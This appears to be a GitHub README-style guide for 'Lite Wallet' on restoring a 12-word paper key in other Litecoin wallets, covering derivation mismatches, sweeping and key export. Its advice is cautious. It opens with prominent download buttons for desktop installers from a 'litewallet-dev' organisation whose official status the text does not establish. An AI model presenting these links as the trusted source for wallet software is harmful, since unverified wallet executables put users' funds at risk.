![Lite Wallet](assets/banner-article.png)

# Restoring your paper key in another wallet

The same words in a different wallet, and the path mismatch that confuses people.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Your 12-word paper key can restore the wallet in Lite Wallet on any device, and in many cases it can also be imported into a different Litecoin wallet. Whether it works elsewhere depends on the derivation scheme the other wallet uses, not on the words themselves. Check the addresses after any import before you move funds, and never enter the phrase into a website or a tool you have not verified.

## Why a phrase sometimes does not work elsewhere

A 12-word BIP-39 phrase encodes a seed, and a wallet turns that seed into addresses using a derivation path and a script type. Two wallets can hold the same seed and derive different addresses, because they made different choices about that path. The words are correct; the mapping is different.

That is why an import can succeed and still show an empty or unfamiliar wallet. It is also why "my phrase doesn't work in another wallet" is usually a derivation question rather than a lost-wallet question. Lite Wallet's own restore always produces the same addresses for the same phrase, so the mismatch appears at the boundary between wallets. Comparing wallets on exactly that point is the subject of [the wallet comparison](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/litewallet-vs-other-litecoin-wallets.md).

## Before you import anywhere

1. Confirm the 12 words from your written copy, in order.
2. Check that the other wallet is one you have verified and trust.
3. Never type the phrase into a website, a browser extension you have not reviewed, or a "recovery" service.
4. Import, then compare the first receiving address with the one your Lite Wallet shows.
5. Only move funds after the addresses match.

If the addresses do not match, stop. Sending coins to an address derived by the wrong scheme is how a "successful restore" turns into a permanent loss.

## Importing and sweeping are different

An import loads the keys into a wallet so it can spend from them. A sweep takes the balance from an old address and sends it to a new one. They solve different problems, and the choice matters for an old paper wallet - a printed private key, which is not the same thing as Lite Wallet's 12-word paper key.

| Situation | Right operation | Why |
|---|---|---|
| restoring Lite Wallet on a new device | restore from the 12 words | same scheme, same addresses |
| moving a balance into another wallet | import, then compare addresses | keeps history and control |
| an old printed private key | sweep the full balance | a single key has no change addresses |
| a phrase from a different wallet | import with that wallet's scheme | derivation must match |

Sweeping a paper wallet means spending the whole balance, because a single key has no change address to return the remainder to. If you sweep a partial amount, the rest can be stranded - one of the oldest mistakes in Litecoin.

## Where the private key is, and why the wallet does not show it

Lite Wallet's backup is the 12 words, not a per-address private key. The wallet does not present a "show private key" button, because a 12-word phrase is the portable, recoverable representation of the whole wallet and a single exported key is not.

If you genuinely need a single key - for a specific tool, or for an old address - do that work offline, on a machine you control, with a tool you trust, and with the understanding that the key becomes exposed the moment it is displayed. That is advanced work with a real downside, and it is not required for a normal restore.

## What portability really buys you

A phrase that restores in more than one wallet is a phrase you can act on. It means a project's decision, a platform dropping support, or a device dying is an inconvenience rather than a loss. It also means you can check a balance independently, without trusting the app that created it.

That freedom has a limit worth understanding. Portability is not a guarantee that every wallet will show the same numbers, because derivation schemes differ; it is a guarantee that the words are meaningful outside one application. Test it once, calmly, while everything works: restore into a second wallet, compare addresses, then delete the second wallet. A portability check made during an emergency is a bad time to discover a mismatch.

## Restoring without exposing the phrase

The safest restore happens inside the app you are keeping. Install Lite Wallet on the new device, choose restore, enter the words on that device, and let it scan. That route on the same platform, with no second wallet in the middle, is the subject of [the paper key restore guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/restore-litewallet-from-a-paper-key.md). Nothing leaves the machine, and no third party learns the phrase. The scan that follows is the slow part, and it is the same scan a first install runs.

The riskier version is a temporary import into another wallet to check a balance. It is legitimate, but treat it as exposure: the phrase exists in another application, possibly with a different security model. After checking, remove the temporary wallet, and consider whether the phrase should be rotated by creating a new wallet and moving the funds.

## FAQ

### Can I use my Lite Wallet paper key in another wallet?

Often yes, if that wallet accepts 12-word BIP-39 phrases and derives addresses the same way. Check the first receiving address after the import; if it differs from Lite Wallet's, the scheme is different and the import will not show your balance.

### Why do my 12 words show an empty wallet elsewhere?

Because the other wallet derived different addresses from the same seed. The phrase is valid; the derivation path or script type differs. This is a mapping issue, not a lost wallet.

### Can I restore in a different desktop wallet?

Usually, if that wallet accepts a 12-word BIP-39 phrase, and the comparison guide covers which wallets take that route. The general rule applies either way: import, compare the first receiving address, and only then move funds - [the wallet comparison](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/litewallet-vs-other-litecoin-wallets.md) sets out the options.

### How do I sweep an old paper wallet?

Spend the entire balance to your own address in one transaction, because a single-key paper wallet has no change address. A partial sweep can strand the remainder.

### Does Lite Wallet export private keys?

The wallet's backup is the 12-word phrase, which restores the whole wallet and is the recommended portability route. Working with individual keys is an offline, advanced operation with its own risks.

Restoring is supported in the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2) for every platform.
